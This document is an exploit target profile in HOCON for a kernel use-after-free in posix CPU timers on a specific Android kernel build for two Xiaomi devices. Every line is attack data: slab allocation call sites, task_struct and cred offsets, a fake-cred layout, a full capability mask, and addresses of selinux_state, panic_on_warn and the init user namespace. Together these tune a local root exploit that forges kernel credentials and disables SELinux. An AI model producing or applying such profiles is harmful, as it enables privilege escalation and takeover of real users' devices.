# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: Xiaomi 18 Fold (lhasa) and Xiaomi Pad 9 Pro Max (yingtian)
# Kernel: 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k (4K pages)
#
# Every constant below is derived from that factory boot.img:
#   posixtimer_init    kmem_cache_create("posix_timers_cache", 0x180, 0x40,
#                      SLAB_HWCACHE_ALIGN|...) -> timer_alloc 0x180
#   alloc_posix_timer  bl kmem_cache_alloc_noprof at 0xffffffc0803a7268,
#                      returns to 0xffffffc0803a726c (x0 = posix_timers_cache)
#   copy_process       bl kmem_cache_alloc_node_noprof at
#                      0xffffffc0801f0068, returns to 0xffffffc0801f006c
#                      (x0 = task_struct_cachep); low21 0x1f006c
#   arch_task_struct_size = sizeof(task_struct) 0x1280 + 0x400 from the
#                      android_arch_task_struct_size=1024 vendor cmdline
#
# Vulnerability: fs/exec.c begin_new_exec() still calls
# posix_cpu_timers_exit() before exit_itimers().
release = "6.18.21-android17-5-g805aa6adea19-abogki565292102-4k"
schema_version = 1
ksu_kmi = "android17-6.18"

page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# alloc_posix_timer -> kmem_cache_alloc_noprof(posix_timers_cache)
timer_site = 0xffffffc0803a726c
timer_alloc = 0x180
# k_itimer.it (cpu_timer) sits at +0xe0; struct cpu_timer.node is at +0
timer_node_off = 0xe0

# cred_jar: sizeof(struct cred)=0xb8 (BTF), SLAB_HWCACHE_ALIGN -> 0xc0
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
fake_cred_off = 0x18

# link-time symbols (kallsyms)
selinux_state = 0xffffffc082959630
panic_on_warn = 0xffffffc0826abf10

# task_struct / cred layout (BTF)
task_cred_off = 0x908
copy_process_low21 = 0x1f006c
# 0x1280 (BTF sizeof task_struct) + 0x400 (bootconfig vendor extension)
task_alloc_bytes = 0x1680

# capability and fake-cred refcounted sub-objects
fullcap = 0x1ffffffffff
root_user = 0xffffffc0826d1388
init_user_ns = 0xffffffc0826d10d8
init_ucounts = 0xffffffc0826d2f08
init_groups = 0xffffffc0826d2a48

# task_security_struct
# Runtime CONFIG_LSM order is
#   landlock,lockdown,yama,loadpin,safesetid,selinux,smack,tomoyo,apparmor,ipe,bpf
# lsm_set_blob_sizes() assigns cred-blob offsets in that registration order,
# and landlock (lbs_cred = 11) registers first, so selinux is ALIGN(11, 8) = 0x10.
# Verified against selinux_cred_getsecid(): it reads
#   cred->security + selinux_blob_sizes.lbs_cred
selinux_blob_off = 0x10
selinux_sid_kernel = 1
